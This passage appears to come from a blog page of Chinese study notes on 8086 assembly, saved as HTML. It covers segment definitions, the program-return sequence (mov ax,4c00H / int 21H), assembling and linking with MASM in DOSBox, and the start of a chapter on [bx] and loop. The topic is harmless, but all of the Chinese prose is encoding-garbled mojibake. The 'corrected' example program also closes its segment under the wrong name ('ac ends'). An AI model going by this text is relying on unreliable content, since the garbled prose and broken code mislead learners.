ä¸­çš„ç¨‹åº&#x3D;&#x3D;</strong></h6><p><strong>è¿™é‡Œæ‰€è¯´çš„ç¨‹åºå°±æ˜¯æŒ‡æºç¨‹åºä¸­æœ€ç»ˆç”±è®¡ç®—æœºæ‰§è¡Œã€å¤„ç†çš„æŒ‡ä»¤æˆ–æ•°æ®ã€‚</strong><br><strong>&#x3D;&#x3D;æ³¨æ„&#x3D;&#x3D;<strong>ï¼Œä»¥åå¯ä»¥å°†</strong>æºç¨‹åºæ–‡ä»¶ä¸­çš„&#x3D;&#x3D;æ‰€æœ‰å†…å®¹ç§°ä¸ºæºç¨‹åº&#x3D;&#x3D;<strong>ï¼Œ</strong>å°†æºç¨‹åºä¸­&#x3D;&#x3D;æœ€ç»ˆç”±è®¡ç®—æœºæ‰§è¡Œã€å¤„ç†çš„æŒ‡ä»¤æˆ–æ•°æ®ï¼Œç§°ä¸ºç¨‹åº&#x3D;&#x3D;<strong>ã€‚ç¨‹åº</strong>æœ€å…ˆä»¥æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å­˜åœ¨æºç¨‹åºä¸­ï¼Œç»ç¼–è¯‘ã€è¿æ¥åè½¬å˜ä¸ºæœºå™¨ç ï¼Œå­˜å‚¨åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ã€‚</strong></p><h6 id="3-æ ‡å·"><a href="#3-æ ‡å·" class="headerlink" title="&#x3D;&#x3D;3.æ ‡å·&#x3D;&#x3D;"></a><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217192918964.png" alt="image-20231217192918964">&#x3D;&#x3D;<strong>3.æ ‡å·</strong>&#x3D;&#x3D;</h6><p>æ±‡ç¼–æºç¨‹åºä¸­ï¼Œé™¤äº†æ±‡ç¼–æŒ‡ä»¤å’Œä¼ªæŒ‡ä»¤å¤–ï¼Œè¿˜æœ‰ä¸€äº›æ ‡å·ï¼Œ<strong>æ¯”å¦‚â€œcodesgâ€™ä¸ªæ ‡å·æŒ‡ä»£äº†ä¸€ä¸ªåœ°å€</strong>ã€‚<strong>æ¯”å¦‚ codesg åœ¨ segment çš„å‰é¢ï¼Œä½œä¸ºä¸€ä¸ªæ®µçš„åç§°ï¼Œè¿™ä¸ªæ®µçš„åç§°æœ€ç»ˆå°†è¢«ç¼–è¯‘ã€è¿æ¥ç¨‹åºå¤„ç†ä¸ºä¸€ä¸ªæ®µçš„æ®µåœ°å€ã€‚</strong></p><h6 id="4-ç¨‹åºçš„ç»“æ„"><a href="#4-ç¨‹åºçš„ç»“æ„" class="headerlink" title="&#x3D;&#x3D;4.ç¨‹åºçš„ç»“æ„&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;4.ç¨‹åºçš„ç»“æ„&#x3D;&#x3D;</strong></h6><p>æˆ‘ä»¬ç°åœ¨è®¨è®ºä¸€ä¸‹æ±‡ç¼–ç¨‹åºçš„ç»“æ„ã€‚åœ¨å‰3ç« ä¸­ï¼Œæˆ‘ä»¬éƒ½æ˜¯é€šè¿‡ç›´æ¥åœ¨ Debug ä¸­å†™å…¥æ±‡ç¼–æŒ‡ä»¤æ¥å†™æ±‡ç¼–ç¨‹åºï¼Œå¯¹äºååˆ†ç®€çŸ­çš„ç¨‹åºè¿™æ ·åšçš„ç¡®æ–¹ä¾¿ã€‚å¯å¯¹äºå¤§ä¸€äº›çš„ç¨‹åºï¼Œå°±ä¸èƒ½å¦‚æ­¤äº†ã€‚<strong>æˆ‘ä»¬éœ€è¦å†™å‡ºèƒ½è®©ç¼–è¯‘å™¨è¿›è¡Œç¼–è¯‘çš„æºç¨‹åºï¼Œè¿™æ ·çš„æºç¨‹åºåº”è¯¥å…·å¤‡èµ·ç çš„ç»“æ„ã€‚</strong><br>æºç¨‹åºæ˜¯ç”±ä¸€äº›æ®µæ„æˆçš„ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è¿™äº›æ®µä¸­å­˜æ”¾ä»£ç ã€æ•°æ®ã€æˆ–å°†æŸä¸ªæ®µå½“ä½œæ ˆç©ºé—´ã€‚æˆ‘ä»¬ç°åœ¨æ¥ä¸€æ­¥æ­¥åœ°å®Œæˆä¸€ä¸ªå°ç¨‹åºï¼Œä»è¿™ä¸ªè¿‡ç¨‹ä¸­ä½“ä¼šä¸€ä¸‹æ±‡ç¼–ç¨‹åºä¸­çš„åŸºæœ¬è¦ç´ å’Œæ±‡ç¼–ç¨‹åºçš„ç®€å•æ¡†æ¶ã€‚</p><p>ä»»åŠ¡:ç¼–ç¨‹è¿ç®—23ã€‚æºç¨‹åºåº”è¯¥æ€æ ·æ¥å†™å‘¢?<br>(1)æˆ‘ä»¬è¦å®šä¹‰ä¸€ä¸ªæ®µï¼Œåç§°ä¸º abcã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line">:</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><p>(2) åœ¨è¿™ä¸ªæ®µä¸­å†™å…¥æ±‡ç¼–æŒ‡ä»¤ï¼Œæ¥å®ç°æˆ‘ä»¬çš„ä»»åŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line"> mov axï¼Œ2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br></pre></td></tr></table></figure><p>(3)ç„¶åï¼Œè¦æŒ‡å‡ºç¨‹åºåœ¨ä½•å¤„ç»“æŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">abc segment</span><br><span class="line"> mov axï¼Œ2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>(4) abc è¢«å½“ä½œä»£ç æ®µæ¥ç”¨ï¼Œæ‰€ä»¥ï¼Œåº”è¯¥å°† abc å’Œ cs è”ç³»èµ·æ¥ã€‚(å½“ç„¶ï¼Œå¯¹äºè¿™ä¸ªç¨‹åºï¼Œä¹Ÿä¸æ˜¯éè¿™æ ·åšä¸å¯ã€‚)<strong>&#x3D;&#x3D;&#x2F;&#x2F;4.2&#x3D;&#x3D;</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"> mov ax,2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">abc ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h6 id="5-ç¨‹åºè¿”å›"><a href="#5-ç¨‹åºè¿”å›" class="headerlink" title="&#x3D;&#x3D;5.ç¨‹åºè¿”å›&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;5.ç¨‹åºè¿”å›&#x3D;&#x3D;</strong></h6><p>æˆ‘ä»¬çš„ç¨‹åºæœ€å…ˆä»¥æ±‡ç¼–æŒ‡ä»¤çš„å½¢å¼å­˜åœ¨æºç¨‹åºä¸­ï¼Œç»ç¼–è¯‘ã€è¿æ¥åè½¬å˜ä¸ºæœºå™¨ç ï¼Œå­˜å‚¨åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œé‚£ä¹ˆï¼Œå®ƒæ€æ ·å¾—åˆ°è¿è¡Œå‘¢?<br>ä¸‹é¢ï¼Œæˆ‘ä»¬åœ¨ DOS(ä¸€ä¸ªå•ä»»åŠ¡æ“ä½œç³»ç»Ÿ)çš„åŸºç¡€ä¸Šï¼Œç®€å•åœ°è®¨è®ºä¸€ä¸‹è¿™ä¸ªé—®é¢˜<br>ä¸€ä¸ªç¨‹åº P2åœ¨å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œåˆ™å¿…é¡»æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åº P1ï¼Œå°† P2ä»å¯æ‰§è¡Œæ–‡ä»¶ä¸­åŠ è½½å…¥å†…å­˜åï¼Œå°†CPU çš„æ§åˆ¶æƒäº¤ç»™ P2ï¼ŒP2æ‰èƒ½å¾—ä»¥è¿è¡Œã€‚P2å¼€å§‹è¿è¡Œåï¼ŒP1æš‚åœè¿è¡Œã€‚<br>è€Œå½“P2 è¿è¡Œå®Œæ¯•åï¼Œåº”è¯¥å°† CPU çš„æ§åˆ¶æƒäº¤è¿˜ç»™ä½¿å®ƒå¾—ä»¥è¿è¡Œçš„ç¨‹åº P1ï¼Œæ­¤åP1ç»§ç»­è¿è¡Œã€‚<br>ç°åœ¨ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªç¨‹åºç»“æŸåï¼Œå°† CPUçš„æ§åˆ¶æƒäº¤è¿˜ç»™ä½¿å®ƒå¾—ä»¥è¿è¡Œçš„ç¨‹åºï¼Œæˆ‘ä»¬ç§°è¿™ä¸ªè¿‡ç¨‹ä¸º:ç¨‹åºè¿”å›ã€‚é‚£ä¹ˆï¼Œå¦‚ä½•è¿”å›å‘¢?åº”è¯¥åœ¨ç¨‹åºçš„æœ«å°¾æ·»åŠ è¿”å›çš„ç¨‹åºæ®µã€‚<br>æˆ‘ä»¬å›è¿‡å¤´æ¥ï¼Œçœ‹ä¸€ä¸‹ç¨‹åº 4.1 ä¸­çš„ä¸¤æ¡æŒ‡ä»¤:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov axï¼Œ4c00H</span><br><span class="line">int 21H</span><br></pre></td></tr></table></figure><p>è¿™ä¸¤æ¡æŒ‡ä»¤æ‰€å®ç°çš„åŠŸèƒ½å°±æ˜¯ç¨‹åºè¿”å›<br>åœ¨ç›®å‰é˜¶æ®µï¼Œæˆ‘ä»¬ä¸å¿…å»ç†è§£ int 21H æŒ‡çš„å«ä¹‰ï¼Œå’Œä¸ºä»€ä¹ˆè¦åœ¨è¿™æ¡æŒ‡ä»¤çš„å‰é¢åŠ ä¸ŠæŒ‡ä»¤mov ax,4c00Hã€‚æˆ‘ä»¬åªè¦çŸ¥é“ï¼Œåœ¨ç¨‹åºçš„æœ«å°¾ä½¿ç”¨è¿™ä¸¤æ¡æŒ‡ä»¤å°±å¯ä»¥å®ç°ç¨‹åºè¿”å›ã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231217200812396.png" alt="image-20231217200812396"></p><h6 id="6-è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯"><a href="#6-è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯" class="headerlink" title="&#x3D;&#x3D;6.è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯&#x3D;&#x3D;"></a><strong>&#x3D;&#x3D;6.è¯­æ³•é”™è¯¯å’Œé€»è¾‘é”™è¯¯&#x3D;&#x3D;</strong></h6><p>å¯è§ï¼Œç¨‹åº 4.2åœ¨è¿è¡Œæ—¶ä¼šå¼•å‘ä¸€äº›é—®é¢˜ï¼Œå› ä¸ºç¨‹åºæ²¡æœ‰è¿”å›ã€‚å½“ç„¶ï¼Œè¿™ä¸ªé”™è¯¯åœ¨ç¼–è¯‘çš„æ—¶å€™æ˜¯ä¸èƒ½è¡¨ç°å‡ºæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œç¨‹åº 4.2 å¯¹äºç¼–è¯‘å™¨æ¥è¯´æ˜¯æ­£ç¡®çš„ç¨‹åºã€‚<br>èˆ¬è¯´æ¥ï¼Œç¨‹åºåœ¨ç¼–è¯‘æ—¶è¢«ç¼–è¯‘å™¨å‘ç°çš„é”™è¯¯æ˜¯è¯­æ³•é”™è¯¯ï¼Œæ¯”å¦‚å°†ç¨‹åº 4.2 å†™æˆå¦‚ä¸‹è¿™æ ·å°±ä¼šå‘ç”Ÿè¯­æ³•é”™è¯¯:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"> mov axï¼Œ2</span><br><span class="line"> add aX,ax</span><br><span class="line"> add ax,ax</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œç¨‹åºä¸­æœ‰ç¼–è¯‘å™¨ä¸èƒ½è¯†åˆ«çš„aumeï¼Œè€Œä¸”ç¼–è¯‘å™¨åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¹Ÿæ— æ³•çŸ¥é“abcæ®µåˆ°ä½•å¤„ç»“æŸã€‚<br>åœ¨æºç¨‹åºç¼–è¯‘åï¼Œåœ¨è¿è¡Œæ—¶å‘ç”Ÿçš„é”™è¯¯æ˜¯é€»è¾‘é”™è¯¯ã€‚è¯­æ³•é”™è¯¯å®¹æ˜“å‘ç°ï¼Œä¹Ÿå®¹æ˜“è§£å†³ã€‚è€Œé€»è¾‘é”™è¯¯é€šå¸¸ä¸å®¹æ˜“è¢«å‘ç°ã€‚ä¸è¿‡ï¼Œç¨‹åº 4.2 ä¸­çš„é”™è¯¯å´æ˜¾è€Œæ˜“è§ï¼Œæˆ‘ä»¬å°†å®ƒæ”¹æ­£è¿‡æ¥:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">assume cs:abc</span><br><span class="line">abc segment</span><br><span class="line"></span><br><span class="line"> mov ax,2</span><br><span class="line"> add ax,ax</span><br><span class="line"> add ax,ax</span><br><span class="line"> </span><br><span class="line"> mov ax,4c00H</span><br><span class="line"> int 21H</span><br><span class="line"> </span><br><span class="line">ac ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure><h4 id="ç¼–è¾‘æºç¨‹åº"><a href="#ç¼–è¾‘æºç¨‹åº" class="headerlink" title="ç¼–è¾‘æºç¨‹åº"></a>ç¼–è¾‘æºç¨‹åº</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231218164126311.png" alt="image-20231218164126311"></p><h4 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="&#x3D;&#x3D;ç¼–è¯‘&#x3D;&#x3D;"></a>&#x3D;&#x3D;ç¼–è¯‘&#x3D;&#x3D;</h4><p>1.dosboxè®¾ç½®è™šæ‹Ÿcç›˜</p><p>2.è¾“å…¥C:\masm</p><p>3.å¦‚æœå·²ç»å°†d:&#x2F;asm&#x2F;MASMè®¾ç½®ä¸ºè™šæ‹Ÿcç›˜ï¼Œè¦è¿è¡Œå…¶ä¸­çš„.ASMåœ¨è™šæ‹ŸåŒ–cç›˜çš„ç›®å½•ä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å°†é‚£ä¸ªæ–‡ä»¶å¤¹è§†ä¸ºcç›˜ï¼Œè¾“å…¥c:1.asm</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227172759096.png" alt="image-20231227172759096"></p><p>4.objï¼ˆç›®æ ‡æ–‡ä»¶ï¼‰æ–‡ä»¶çš„ç”Ÿæˆ</p><p>ä¸è¾“å…¥é»˜è®¤åœ¨1.asmçš„æ‰€åœ¨æ–‡ä»¶å¤¹å†…ç”Ÿæˆ1.obj</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173105489.png" alt="image-20231227173105489"></p><p>5.åˆ—è¡¨æ–‡ä»¶çš„ç”Ÿæˆ</p><p>ä¸è¾“å…¥è¾“å‡ºåœ°å€å³ä¸ºä¸ç”Ÿæˆ</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173239069.png" alt="image-20231227173239069"></p><p>6.äº¤å‰å¼•ç”¨æ–‡ä»¶çš„ç”Ÿæˆ</p><p>ä¸è¾“å…¥è¾“å‡ºåœ°å€å³ä¸ºä¸ç”Ÿæˆ</p><p>7.ç¼–è¯‘ç»“æŸ</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227173436707.png" alt="image-20231227173436707"></p><h4 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h4><p>1.2.æ­¥éª¤ä¸ä¸ŠåŒç†</p><p>3.è¾“å…¥link.exe</p><p>4.å¦‚æœæ˜¯objæ–‡ä»¶è¾“å…¥æ–‡ä»¶åå³å¯ï¼Œéobjæ–‡ä»¶éœ€è¦å¸¦ä¸Šæ–‡ä»¶åç¼€</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227174601366.png" alt="image-20231227174601366"></p><p>5.å› ä¸ºå·²ç»ç¡®å®šäº†ç›®æ ‡æ–‡ä»¶åä¸º 1.bjï¼Œåˆ™ç¨‹åºé»˜è®¤è¦è¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶åä¸º1.EXEï¼Œæ‰€ä»¥å¯ä»¥ä¸å¿…å†å¦è¡ŒæŒ‡å®šæ–‡ä»¶åã€‚ç›´æ¥æŒ‰ Enter é”®ï¼Œç¼–è¯‘ç¨‹åºå°†åœ¨å½“å‰çš„ç›®å½•ä¸‹ï¼Œç”Ÿæˆ1.EXEæ–‡ä»¶ã€‚</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227174757293.png" alt="image-20231227174757293"></p><p>6.å¿½ç•¥æ˜ åƒæ–‡ä»¶ç”Ÿæˆï¼Œç›´æ¥ã€enterã€‘</p><p>7.åº“æ–‡ä»¶è¿æ¥ï¼Œå¿½ç•¥ç›´æ¥ã€enterã€‘</p><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227175112103.png" alt="image-20231227175112103"></p><p>è­¦å‘Šä¸ºï¼šæ²¡æœ‰æ ˆæ®µï¼ˆåæ–‡å†å™ï¼‰</p><p>è¿æ¥çš„ä½œç”¨ï¼š</p><p>(1)å½“<strong>æºç¨‹åºå¾ˆå¤§</strong>æ—¶ï¼Œå¯ä»¥å°†å®ƒ<strong>åˆ†ä¸ºå¤šä¸ªæºç¨‹åºæ–‡ä»¶</strong>æ¥ç¼–è¯‘ï¼Œ<strong>æ¯ä¸ªæºç¨‹åºç¼–è¯‘æˆä¸ºç›®æ ‡æ–‡ä»¶å</strong>ï¼Œ<strong>å†ç”¨è¿æ¥ç¨‹åºå°†å®ƒä»¬è¿æ¥åˆ°ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶</strong>;<br>(2)&#x3D;&#x3D;<strong>ç¨‹åºä¸­è°ƒç”¨äº†æŸä¸ªåº“æ–‡ä»¶ä¸­çš„å­ç¨‹åºï¼Œéœ€è¦å°†è¿™ä¸ªåº“æ–‡ä»¶å’Œè¯¥ç¨‹åºç”Ÿæˆçš„ç›®æ ‡æ–‡ä»¶è¿æ¥åˆ°ä¸€èµ·ï¼Œç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶;</strong>&#x3D;&#x3D;<br>(3)ä¸€ä¸ªæºç¨‹åºç¼–è¯‘åï¼Œå¾—åˆ°äº†å­˜æœ‰æœºå™¨ç çš„ç›®æ ‡æ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶ä¸­çš„æœ‰äº›å†…å®¹è¿˜ä¸èƒ½ç›´æ¥ç”¨æ¥ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿æ¥ç¨‹åºå°†è¿™äº›å†…å®¹å¤„ç†ä¸ºæœ€ç»ˆçš„å¯æ‰§è¡Œä¿¡æ¯ã€‚æ‰€ä»¥ï¼Œ<strong>åœ¨&#x3D;&#x3D;åªæœ‰ä¸€ä¸ªæºç¨‹åºæ–‡ä»¶&#x3D;&#x3D;ï¼Œè€Œ&#x3D;&#x3D;åˆä¸éœ€è¦è°ƒç”¨æŸä¸ªåº“ä¸­çš„å­ç¨‹åº&#x3D;&#x3D;çš„æƒ…å†µä¸‹ï¼Œä¹Ÿ&#x3D;&#x3D;å¿…é¡»ç”¨&#x3D;&#x3D;è¿æ¥ç¨‹åºå¯¹ç›®æ ‡æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚</strong><br>æ³¨æ„ï¼Œå¯¹äºè¿æ¥çš„è¿‡ç¨‹ï¼Œ<strong>å¯æ‰§è¡Œæ–‡ä»¶æ˜¯æˆ‘ä»¬è¦å¾—åˆ°çš„æœ€ç»ˆç»“æœã€‚</strong></p><h4 id="ä»¥ç®€åŒ–çš„æ–¹å¼è¿›è¡Œç¼–è¯‘å’Œè¿æ¥"><a href="#ä»¥ç®€åŒ–çš„æ–¹å¼è¿›è¡Œç¼–è¯‘å’Œè¿æ¥" class="headerlink" title="ä»¥ç®€åŒ–çš„æ–¹å¼è¿›è¡Œç¼–è¯‘å’Œè¿æ¥"></a>ä»¥ç®€åŒ–çš„æ–¹å¼è¿›è¡Œç¼–è¯‘å’Œè¿æ¥</h4><p>ç®€åŒ–ç¼–è¯‘<strong>C:\&gt;masm c:\1;</strong></p><p>ç®€åŒ–è¿æ¥<strong>C:\&gt;link 1;</strong></p><p><strong>&#x3D;&#x3D;è‡ªåŠ¨å¿½ç•¥ä¸­é—´æ–‡ä»¶çš„ç”Ÿæˆ&#x3D;&#x3D;</strong></p><h4 id="1-exeçš„æ‰§è¡Œ"><a href="#1-exeçš„æ‰§è¡Œ" class="headerlink" title="1.exeçš„æ‰§è¡Œ"></a>1.exeçš„æ‰§è¡Œ</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227183159432.png" alt="image-20231227183159432"></p><h4 id="ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è¿½è¸ª"><a href="#ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è¿½è¸ª" class="headerlink" title="ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è¿½è¸ª"></a>ç¨‹åºæ‰§è¡Œè¿‡ç¨‹çš„è¿½è¸ª</h4><p><img src="/../AppData/Roaming/Typora/typora-user-images/image-20231227193505217.png" alt="image-20231227193505217"></p><h2 id="ç¬¬äº”ç« -BX-å’Œ-loop-æŒ‡ä»¤"><a href="#ç¬¬äº”ç« -BX-å’Œ-loop-æŒ‡ä»¤" class="headerlink" title="ç¬¬äº”ç« [BX]å’Œ loop æŒ‡ä»¤"></a>ç¬¬äº”ç« [BX]å’Œ loop æŒ‡ä»¤</h2><p><strong>1.[bx]å’Œå†…å­˜å•å…ƒçš„æè¿°</strong></p><p>è¦å®Œæ•´åœ°æè¿°ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œéœ€è¦<strong>ä¸¤ç§ä¿¡æ¯</strong>:&#x3D;&#x3D;<strong>1å†…å­˜å•å…ƒçš„åœ°å€</strong>&#x3D;&#x3D;;&#x3D;&#x3D;<strong>2å†…å­˜å•å…ƒçš„é•¿åº¦</strong>&#x3D;&#x3D;</p><p>mov axï¼Œ[bx]<br>&#x3D;&#x3D;<strong>å°†ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹é€å…¥ ax</strong>&#x3D;&#x3D;<strong>ï¼Œè¿™ä¸ªå†…å­˜å•å…ƒçš„é•¿åº¦ä¸º 2 å­—èŠ‚(å­—å•å…ƒ)ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œ</strong>&#x3D;&#x3D;<strong>åç§»åœ°å€åœ¨ bxä¸­</strong>&#x3D;&#x3D;ï¼Œ&#x3D;&#x3D;æ®µåœ°å€åœ¨ ds ä¸­&#x3D;&#x3D;ã€‚</p><p><strong>2.æˆ‘ä»¬å®šçš„æè¿°æ€§çš„ç¬¦å·:â€œ()â€</strong></p><p>(ax)è¡¨ç¤ºaxä¸­çš„å†…å®¹ã€(al)è¡¨ç¤ºalä¸­çš„å†…å®¹</p><p>(20000H)è¡¨ç¤ºå†…å­˜ 20000H å•å…ƒçš„å†…å®¹ï¼ˆ()ä¸­çš„å†…å­˜å•å…ƒçš„åœ°å€ä¸ºç‰©ç†åœ°å€ï¼‰;</p><p>((ds)*16+(bx))è¡¨ç¤º:<strong>ds ä¸­çš„å†…å®¹ä¸ºADR1</strong>ï¼Œ<strong>bxä¸­çš„å†…å®¹ä¸º ADR2</strong>ï¼Œ<strong>å†…å­˜ADR1*16+ADR2å•å…ƒçš„å†…å®¹</strong></p><p>ä¹Ÿå¯ä»¥ç†è§£ä¸º:<strong>ds ä¸­çš„ ADR1 ä½œä¸ºæ®µåœ°å€</strong>ï¼Œ<strong>bx ä¸­çš„ ADR2ä½œä¸ºåç§»åœ°å€</strong>ï¼Œ<strong>å†…å­˜ADR1:ADR2å•å…ƒçš„å†…å®¹ã€‚</strong></p><p>æ³¨æ„ï¼Œâ€œ( )â€ä¸­çš„å…ƒç´ å¯ä»¥æœ‰ <strong>3 ç§ç±»å‹</strong>:&#x3D;&#x3D;<strong>1.å¯„å­˜å™¨å</strong>&#x3D;&#x3D;;&#x3D;&#x3D;<strong>2.æ®µå¯„å­˜å™¨å</strong>&#x3D;&#x3D;:&#x3D;&#x3D;<strong>3.å†…å­˜å•å…ƒçš„ç‰©ç†åœ°å€</strong>&#x3D;&#x3D;(ä¸€ä¸ª 20ä½æ•°æ®)ã€‚æ¯”å¦‚:<br>**(ax)ã€(ds)ã€(al)ã€ (cx)ã€(20000H)ã€((ds)*16+(bx))<strong>ç­‰æ˜¯</strong>æ­£ç¡®**çš„ç”¨æ³•;</p><p><strong>(2000:0)ã€((ds):1000H)<strong>ç­‰æ˜¯</strong>ä¸æ­£ç¡®</strong>çš„ç”¨æ³•ã€‚</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹(X)çš„åº”ç”¨ï¼Œæ¯”å¦‚ï¼Œ<br>(1)axä¸­çš„å†…å®¹ä¸º0010Hï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(ax)&#x3D;0010H;</p><p>(2) 2000:1000 å¤„çš„å†…å®¹ä¸º 0010Hï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(21000H)&#x3D;0010H;</p><p>(3)å¯¹äºmov ax,[2]çš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(ax)&#x3D;((ds)<em>16+2);</em></p><p>(4)å¯¹äº mov  [2],axçš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š((ds)*16+2)&#x3D;(ax);</p><p>(5)å¯¹äºadd ax,2çš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(ax)&#x3D;(ax)+2;</p><p>(6)å¯¹äºadd ax,bxçš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(ax)&#x3D;(ax)+(bx);</p><p>(7)å¯¹äº push axçš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(sp)&#x3D;(sp)-2((ss)*16+(sp))&#x3D;(ax)</p><p>(8)å¯¹äº pop axçš„åŠŸèƒ½ï¼Œå¯ä»¥è¿™æ ·æ¥æè¿°ï¼š(ax)&#x3D;((ss)*16+(sp))(sp)&#x3D;(sp)+2</p><p><strong>â€œ(X)â€</strong>æ‰€è¡¨ç¤ºçš„æ•°æ®æœ‰ä¸¤ç§ç±»å‹:<strong>1.å­—èŠ‚</strong>;<strong>2.å­—</strong>ã€‚</p><p>(al)ã€(bI)ã€(cl)ç­‰å¾—åˆ°çš„æ•°æ®ä¸ºå­—èŠ‚å‹;</p><p>(ds)ã€(ax)ã€(bx)ç­‰å¾—åˆ°çš„æ•°æ®ä¸ºå­—å‹;</p><p>(al)&#x3D;(20000H)ï¼Œåˆ™(20000H)å¾—åˆ°çš„æ•°æ®ä¸ºå­—èŠ‚å‹;</p><p>(ax)&#x3D;(20000H)ï¼Œåˆ™(20000H)å¾—åˆ°çš„æ•°æ®ä¸ºå­—å‹ã€‚</p><p><strong>3.çº¦å®šç¬¦å·idata è¡¨ç¤ºå¸¸é‡</strong></p><h4 id="5-1-BX"><a href="#5-1-BX" class="headerlink" title="5.1[BX]"></a>5.1[BX]</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inc bx</span><br></pre></td></tr></table></figure><p>å«ä¹‰ï¼šbxä¸­çš„å†…å®¹åŠ 1ã€‚</p><h4 id="5-2loopæŒ‡ä»¤"><a href="#5-2loopæŒ‡ä»¤" class="headerlink" title="5.2loopæŒ‡ä»¤"></a>5.2loopæŒ‡ä»¤</h4><p>æ ¼å¼</p><p>(1)åœ¨ &#x3D;&#x3D;<strong>cx ä¸­å­˜æ”¾å¾ªç¯æ¬¡æ•°</strong>&#x3D;&#x3D;</p><p>(2)<strong>&#x3D;&#x3D;loop  æŒ‡ä»¤ä¸­çš„æ ‡å·æ‰€æ 